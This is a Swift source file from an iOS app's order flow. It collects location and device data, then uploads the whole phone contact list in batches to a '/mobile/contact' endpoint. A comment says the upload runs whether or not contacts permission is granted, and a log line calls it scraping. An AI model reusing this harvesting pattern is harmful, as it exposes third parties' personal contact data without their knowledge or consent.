//
//  Mancry_uploadData.swift
//  mancry_Jan
//
//  Created by mac_liuh on 2026/1/23.
//

import UIKit
import CoreLocation
import Contacts

class Mancry_uploadData: NSObject {
    
  public static var contactIndex = 0
    
  
    static func requestLocationPermissionAndSubmit(
        orderData: [String: Any],
        successCallback: @escaping () -> Void,
        failureCallback: @escaping (String) -> Void
    ) {
        
        // 步骤1: 使用 Mancry_PublicMethodS 中的定位方法
        Mancry_PublicMethodS.getLocationWithCompletion { latitude, longitude, authorized, error in
            
            if let error = error {
                failureCallback("Failed to get location: \(error.localizedDescription)")
                return
            }
            
            if !authorized {
                failureCallback("Location permission denied")
                return
            }
            
            print("获取定位成功----\(latitude) ---\(longitude)")
            
            // 步骤2: 调用 userSubmitV3 接口
            self.callUserSubmitV3(
                orderData: orderData,
                latitude: latitude,
                longitude: longitude,
                successCallback: { orderId in
                    
                    // 步骤3: 调用 device 接口
                    self.callMobileDevice(
                        orderId: orderId,
                        successCallback: {
                            
                            // 步骤4: 获取通讯录权限
                            Mancry_PublicMethodS.getContactsPermissionStatusWithCompletion { contactsGranted in
                                
                                // 步骤5: 调用 contact 接口（无论权限是否授予都调用）
                                self.callMobileContact(
                                    orderId: orderId,
                                    contactsGranted: contactsGranted,
                                    successCallback: {
                                        // contact 内部已完成 → ready
                                        successCallback()
                                    },
                                    failureCallback: failureCallback
                                )
                            }
                        },
                        failureCallback: failureCallback
                    )
                    ///
                },
                failureCallback: failureCallback
            )
        }
    }
    
    // MARK: - Private Methods
    
    /// 调用 /app/v3/order/userSubmitV3 接口
    private static func callUserSubmitV3(
        orderData: [String: Any],
        latitude: Double,
        longitude: Double,
        successCallback: @escaping (String) -> Void,
        failureCallback: @escaping (String) -> Void
    ) {
        
        var submitData = orderData
        submitData["latitude"] = "\(latitude)"
        submitData["longitude"] = "\(longitude)"
        
        let parametersDic = Mancry_PublicMethodS.mancry_publicRequestBody(with: submitData, isSign: true)
        
        guard let postData = try? JSONSerialization.data(withJSONObject: parametersDic) else {
            failureCallback("Failed to serialize userSubmitV3 request")
            return
        }
        
        Mancry_RequestData.figures_requestnetworkBodyData(
            urlString: "/app/v3/order/userSubmitV3",
            httpBody: postData,
            successCallBack: { result in
                let code = result["resultCode"] as? Int ?? -1
                if code == 200 {
                    guard let dataDict = result["data"] as? [String: Any],
                          let orderId = dataDict["orderId"] as? String else {
                        failureCallback("Invalid response from userSubmitV3")
                        return
                    }
                    successCallback(orderId)
                } else {
                    let message = result["resultMsg"] as? String ?? "userSubmitV3 failed"
                    failureCallback(message)
                }
            },
            failureCallBack: { error in
                failureCallback("userSubmitV3 request error: \(error.localizedDescription)")
            }
        )
    }
    
    /// 调用 /app/v3/mobile/device 接口
    public static func callMobileDevice(
        orderId: String,
        successCallback: @escaping () -> Void,
        failureCallback: @escaping (String) -> Void
    ) {
        let mancry_allDic = Mancry_getDevicebaseData.mancry_getResgiterData()
        
        let deviceData: [String: Any] = [
            "orderId": orderId,
        ]
        
        let parametersDic = Mancry_PublicMethodS.mancry_publicRequestBody(with: deviceData ,isSign: true,mancry_allDic as? [String : Any])
        
        guard let postData = try? JSONSerialization.data(withJSONObject: parametersDic) else {
            failureCallback("Failed to serialize device request")
            return
        }
        
        Mancry_RequestData.figures_requestnetworkBodyData(
            urlString: "/app/v3/mobile/device",
            httpBody: postData,
            successCallBack: { result in
                let code = result["resultCode"] as? Int ?? -1
                if code == 200 {
                    successCallback()
                } else {
                    let message = result["resultMsg"] as? String ?? "mobile/device failed"
                    failureCallback(message)
                }
            },
            failureCallBack: { error in
                failureCallback("mobile/device request error: \(error.localizedDescription)")
            }
        )
    }
    
    /// 调用 /app/v3/mobile/contact 接口
    public static func callMobileContact(
        orderId: String,
        contactsGranted: Bool,
        successCallback: @escaping () -> Void,
        failureCallback: @escaping (String) -> Void
    ) {
        self.mancry_uploadcallMobileContact(
            orderId: orderId,
            contactsGranted: contactsGranted,
            successCallback: successCallback,
            failureCallback: failureCallback
        )
    }
    
    private static func mancry_uploadcallMobileContact(
        orderId: String,
        contactsGranted: Bool,
        successCallback: @escaping () -> Void,
        failureCallback: @escaping (String) -> Void
    ) {
        
        let mancry_arr = Mancry_getDevicebaseData.getEquipmentContact(withMaxNum: mancry_Total, withPerCount: mancry_onceTotal)
        let mancry_total = mancry_arr.count
        if self.contactIndex == mancry_total{
            self.contactIndex = 0
            // contact → ready
            self.callOrderReady(orderId: orderId) {
                NotificationCenter.default.post(name: NSNotification.Name.init("mancry_uploadSucceed"), object: nil)
                successCallback()
            } failureCallback: { errorMsg in
                failureCallback(errorMsg)
            }
        }else{
            
            let listAr = mancry_arr[contactIndex]
            let nosignDic = ["list": listAr,
                             "orderId": orderId
            ]
            
            let contactData: [String: Any] = [
                "orderId": orderId,
            ]
            
            let parametersDic = Mancry_PublicMethodS.mancry_publicRequestBody(with: nosignDic,isSign: false,contactData,true)
            
            guard let postData = try? JSONSerialization.data(withJSONObject: parametersDic) else {
                failureCallback("Failed to serialize contact request")
                return
            }
            
            Mancry_RequestData.figures_requestnetworkBodyData(
                urlString: "/app/v3/mobile/contact",
                httpBody: postData,
                successCallBack: { result in
                    let code = result["resultCode"] as? Int ?? -1
                    if code == 200 {
                        //                    successCallback()
                        self.contactIndex += 1
                        print("抓取通讯录成功")
                        self.mancry_uploadcallMobileContact(
                            orderId: orderId,
                            contactsGranted: contactsGranted,
                            successCallback: successCallback,
                            failureCallback: failureCallback
                        )
                        
                        
                    } else {
                        let message = result["resultMsg"] as? String ?? "mobile/contact failed"
                        failureCallback(message)
                    }
                },
                failureCallBack: { error in
                    failureCallback("mobile/contact request error: \(error.localizedDescription)")
                }
            )
        }
    }
    
    
    /// 调用 /app/v3/order/ready 接口
    public static func callOrderReady(
        orderId: String,
        successCallback: @escaping () -> Void,
        failureCallback: @escaping (String) -> Void
    ) {
        
        let readyData: [String: Any] = [
            "orderId": orderId
        ]
        
        let parametersDic = Mancry_PublicMethodS.mancry_publicRequestBody(with: readyData,isSign: true)
        
        guard let postData = try? JSONSerialization.data(withJSONObject: parametersDic) else {
            failureCallback("Failed to serialize ready request")
            return
        }
        
        Mancry_RequestData.figures_requestnetworkBodyData(
            urlString: "/app/v3/order/ready",
            httpBody: postData,
            successCallBack: { result in
                let code = result["resultCode"] as? Int ?? -1
                if code == 200 {
                    successCallback()
                    print("下单完成")
                } else {
                    let message = result["resultMsg"] as? String ?? "order/ready failed"
                    failureCallback(message)
                }
            },
            failureCallBack: { error in
                failureCallback("order/ready request error: \(error.localizedDescription)")
            }
        )
    }
    
    @objc public static func mancry_insertPointData(insertId: String)  {
        
        let deviceData: [String: Any] = [
            "eventCode": insertId,
            "eventContent":"",
            "remark1":"",
            "remark2":"",
            "remark3":""
        ]
        
        let parametersDic = Mancry_PublicMethodS.mancry_publicRequestBody(with: deviceData ,isSign: true)
        
        guard let postData = try? JSONSerialization.data(withJSONObject: parametersDic) else {
            
            return
        }
        
        Mancry_RequestData.figures_requestnetworkBodyData(
            urlString: "/app/v3/bury/record",
            httpBody: postData,
            successCallBack: { result in
                let code = result["resultCode"] as? Int ?? -1
                if code == 200 {
                  
                }
            },
            failureCallBack: { error in
                
            }
        )
    }
    

    
}
